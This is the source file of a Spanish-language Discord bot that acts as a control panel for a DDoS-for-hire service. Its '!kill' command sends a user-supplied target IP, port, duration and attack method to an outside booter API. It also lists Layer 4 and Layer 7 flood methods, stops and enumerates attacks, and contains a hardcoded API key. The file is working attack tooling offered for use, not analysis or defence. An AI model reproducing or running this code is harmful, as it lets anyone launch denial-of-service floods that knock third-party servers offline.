const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send('Hola Express!')
});

app.listen(3000, () => {
  console.log('Creado por : @GonsanZ');
});

const { Client, Intents } = require('discord.js');
const { MessageEmbed } = require('discord.js');  

const intents = new Intents([
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.DIRECT_MESSAGES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
]);

const bot = new Client({ intents });

bot.once('ready', () => {
    console.log('Bot listo.');
});

const whitelistedIds = ['', '', '', ''];
const blacklistedIps = [
    { ip: "1.1.1.1", port: 80},
];

function channelCheck(channel) {
    return channel.id === '1140987091843213824';
}

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!kill')) {
        if (!channelCheck(message.channel)) {
            const embed = new MessageEmbed()
                .setTitle("Comando restringido")
                .setDescription("Este comando sólo se puede utilizar en <#1139985684514484345> canal.")
                .setThumbnail(message.author.avatarURL({dynamic: true}))
                .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }))
                .setColor('#FF0000');
            if (message.channel.type === 'DM') {
                await message.author.send({ embeds: [embed] });
            } else {
                await message.reply({ embeds: [embed] });
            }
            return;
        }

        const args = message.content.slice('!kill'.length).trim().split(/ +/);
        const input1 = args[0];
        const input2 = parseInt(args[1]);
        const input3 = parseInt(args[2]);
        const input4 = args[3];

        const targetIp = input1;
        const targetPort = input2;

        if (blacklistedIps.some(ip => ip.ip === targetIp && ip.port === targetPort)) {
            const embed = new MessageEmbed()
                .setTitle("BlackList IP")
                .setDescription("La combinación de dirección IP y puerto de destino está en la lista negra y no puede ser atacada.")
              .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setColor('#2F3136')

            await message.reply({ embeds: [embed] });
            return;
        }

        const apiURL = `https://gloryrp.fun/api_key=&host=${input1}&port=${input2}&time=${input3}&method=${input4}`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });
            const responseData = await response.json();

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('Ataque enviado')
                    .setDescription('root@127.0.0.1: DDoSAttack#~ sent attack')
                    .setColor('#2F3136')
                    .addField('Target:', `${input1}:${input2}`, true)
                    .addField('Duración', `${input3} seconds`, true)
                    .addField('Método', `${input4}`, true)
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setThumbnail(message.author.avatarURL({dynamic: true}))
                    .setFooter(`Solicitado por ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }));
              
                await message.reply({ embeds: [embed] });
            } else {
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error código: ${response.status} - error razón: ${responseData}`)
                   .setColor('#2F3136');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#2F3136');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!methods') {
        const methodsList = [
            "TCP-ACK - L4",
            "TCP-NFO - L4",
            "TCP-TFO - L4",
            "TCP-OVHv3 - L4",
            "TCP-BYPASS - L4",
            "TCP-SYN - L4",
            "UDP-RAW - L4",
            "UDP-RAKNET - L4",
            "AMP-STUN - L4",
            "-----------------",
            "HTTP-SOCKET - L7",
            "HTTP-CRANK - L7",
            "HTTP-FLAG - L7",
            "HTTP-BROWSER - L7",
            "HTTP-PLUG - L7",
            "HTTP-BYPASS - L7",
        ];

        const methodsFormatted = methodsList.map(method => `\`${method}\``).join('\n');

        const embed = new MessageEmbed()
            .setTitle("DDoSAttack#~ ls")
            .setDescription("root@127.0.0.1: DDoSAttack#~ mostrando todos los métodos disponibles")
            .setColor('#2F3136')
            .addField("Métodos", methodsFormatted, false);

        await message.reply({ embeds: [embed] });
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!stop')) {
        const args = message.content.slice('!stop'.length).trim().split(/ +/);
        const input1 = args[0];

        if (!whitelistedIds.includes(message.author.id)) {
            const embed = new MessageEmbed()
                .setTitle("Permiso denegado")
                .setDescription("No tienes permiso para ejecutar este comando.")
                .setColor('#FF0000');

            await message.reply({ embeds: [embed], ephemeral: true });
            return;
        }

        const apiURL = `https://gloryrp.fun/stop?api_key=`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('Stopped Attack')
                    .setDescription('root@127.0.0.1:  DDoSAttack#~ attack off')
                    .setColor('#2F3136')
                    .addField('Ataque ID', input1)
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setTimestamp()
                    .setFooter(`Solicitado por ${message.author.tag}`, message.author.displayAvatarURL());

                await message.reply({ embeds: [embed] });
            } else {
                const errorText = await response.text();
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error código: ${response.status} - error razón: ${errorText}`)
                    .setColor('#FF0000');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#FF0000');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!ids') {
        if (!whitelistedIds.includes(message.author.id)) {
            const embed = new MessageEmbed()
                .setTitle("Permiso denegado")
                .setDescription("No tienes permiso para ejecutar este comando.")
                .setColor('#FF0000');

            await message.reply({ embeds: [embed], ephemeral: true });
            return;
        }
        const apiURL = 'https://gloryrp.fun/ids?api_key=cRU6-1ktRA-coIO-r13pE&id=';
        const headers = {
            'User-Agent': 'Mozila/5.0 (gloryrp.fun)',
        };

        try {
            const response = await fetch(apiURL, { headers });
            const responseData = await response.text(); 

            if (response.ok) {
                const embed = new MessageEmbed()
                    .setTitle('Todos las IDs atacadas')
                    .setDescription('root@127.0.0.1:  DDoSAttack#~ enumerando todos los ataques')
                    .setColor('#2F3136')
                    .addField('Ataques', responseData || 'No hay ID de ataque disponibles') 
                    .setAuthor(message.author.username, message.author.avatarURL())
                    .setTimestamp()
                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL());

                await message.reply({ embeds: [embed] });
            } else {
                const embed = new MessageEmbed()
                    .setTitle('Error')
                    .setDescription(`error código: ${response.status} - error razón: ${responseData}`)
                    .setColor('#FF0000');

                await message.reply({ embeds: [embed] });
            }
        } catch (error) {
            const embed = new MessageEmbed()
                .setTitle('Error')
                .setDescription(`Error OO9S93Z: ${error}`)
                .setColor('#FF0000');

            await message.reply({ embeds: [embed] });
        }
    }
});

bot.login('')
